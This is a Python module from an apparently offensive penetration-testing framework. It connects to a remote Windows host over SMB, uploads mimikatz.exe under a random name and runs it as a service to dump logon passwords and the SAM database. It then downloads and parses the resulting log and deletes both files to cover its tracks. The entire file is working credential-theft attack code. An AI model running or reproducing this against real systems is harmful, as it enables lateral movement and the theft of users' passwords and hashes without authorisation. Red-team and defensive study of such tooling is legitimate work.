import core.psexec
import core.cred_parser

import uuid

class PSExecMimikatz(core.psexec.PSExec):

    NAME = "PSExec Mimikatz"
    DESCRIPTION = "Uploads mimikatz.exe and execs it"
    AUTHORS = ['zerosum0x0', 'TheNaterz']

    def load(self):
        super(PSExecMimikatz, self).load()
        self.options.register("MIMIPATH", "data/bin/mimikatz.exe", "the mimikatz.exe binary to upload")

        cmd = 'C:\\~MIMINAME~ "log C:\\~LOGNAME~" privilege::debug token::elevate sekurlsa::logonpasswords lsadump::sam exit'
        self.options.register("CMDLINE", cmd, "the mimi command line to execute")

    def smb_pwn(self, client, ip, port):
        data = self.psexec_mimikatz(client)

        domain = self.options.get("SMBDOMAIN")

        #print(data)

        cp = core.cred_parser.CredParse(self.shell, self, ip, domain)
        self.print_good(cp.parse_mimikatz(data, False))
        #self.print_good(cp.parse_hashdump_sam(data))

    def psexec_mimikatz(self, conn):
        share = self.options.get("SHARE")
        rpath = self.options.get("RPATH")
        mimipath = self.options.get("MIMIPATH")
        cmdline = self.options.get("CMDLINE")

    	miminame = rpath + uuid.uuid4().hex + ".exe"
    	logname = rpath + uuid.uuid4().hex + ".txt"


        cmdline = cmdline.replace("~MIMINAME~", miminame)
        cmdline = cmdline.replace("~LOGNAME~", logname)

    	self.print_status("Mimi file: %s" % miminame)
    	self.print_status("Log file: %s" % logname)

    	conn.upload_file(share, miminame, mimipath)
    	conn.service_exec(cmdline)

    	out = conn.download_file(share, logname)

    	try:
    		conn.delete_file(share, logname)
    		conn.delete_file(share, miminame)
    	except:
    		pass

    	return out
